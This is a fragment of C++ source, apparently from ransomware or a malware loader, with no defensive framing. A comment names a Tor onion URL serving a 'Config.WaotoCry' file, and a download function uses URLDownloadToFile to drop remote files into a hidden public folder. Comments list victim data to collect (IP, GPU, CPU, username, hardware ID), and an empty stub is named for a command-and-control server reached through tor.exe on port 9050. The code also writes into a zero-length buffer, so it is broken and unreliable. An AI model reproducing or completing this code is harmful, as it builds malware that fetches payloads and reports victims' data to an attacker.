#include "Un-main.h"




//lalcuktcocnxehe7e6vgzvhnht6dp7mpuzzzgsizk6ozpqzaczh5o2qd.onion/download/Config_download/Config.WaotoCry
//string file_Config_dir = "C:\\Users\\Public\\Documents\\dD0bB0";

int download(string usl, string file_name) {
    char all_path[] = "";
    strcpy(all_path, file_Config_dir.c_str());
    strcat(all_path, file_name.c_str());
     char *web = (char*)usl.c_str();
    HRESULT hr = URLDownloadToFile(NULL, (LPCSTR)web, (LPCSTR)all_path, 0, NULL);
    if (hr == S_OK)
    {
        return 1;
    }
    else
    {
        return 0;
    }

}



//string
//IP,GPU,CPU,USERNAME,HWID




//套接字通讯 地址为回送:9050 接收进程为:tor.exe
int Socket_C2_server_information() {

}